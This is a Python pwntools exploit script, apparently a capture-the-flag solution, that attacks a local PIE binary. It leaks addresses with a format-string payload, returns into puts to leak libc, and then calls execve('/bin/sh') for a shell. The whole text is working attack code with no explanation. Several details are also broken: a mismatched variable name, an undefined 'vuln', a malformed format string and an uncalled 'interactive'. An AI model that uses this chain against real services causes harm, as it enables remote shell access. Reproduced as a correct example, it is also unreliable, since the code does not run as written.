from pwn import *
exe = './pie_server'
elf = context.binary = ELF(exe, checksec=False)
io = process(exe)
offset = 264    #8 bytes after 264 bytes goes to the rip register

#leaking the piebase address
io.sendlineafter(b':','%{9}$p')
io.recvuntil('Hello ')
leaked_addr = int(io.recvline(),16)

info('leaked address: %#x', leaked_addr)
elf.address = leaked_address - 0x1295 # 0x1295 is the offset from piebase to the leaked function address
info('piebase: %#x', elf.address)

pop_rdi = elf.address + 0x12ab # gadget from pop_rdi

payload = flat({
    offset:[
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        vuln
    ]
})
io.sendlineafter(b':p',payload)
io.recvlines(2)

got_puts = unpack(io.recv()[:6].ljust(8,b'\x00'))
info('leaked got_puts %#x', got_puts)
libc_base = got_puts - 0x84420 # 0x84420 is the offset of puts in libc
info('libc base %#x', libc_base)

#calling execve with /bin/sh

execve = libc_base + 0xe3500
bin_sh = libc_base + 0x1b45bd

payload = flat({
    offset:[
        pop_rdi,
        bin_sh,
        execve
    ]
})
io.sendline(payload)
io.interactive
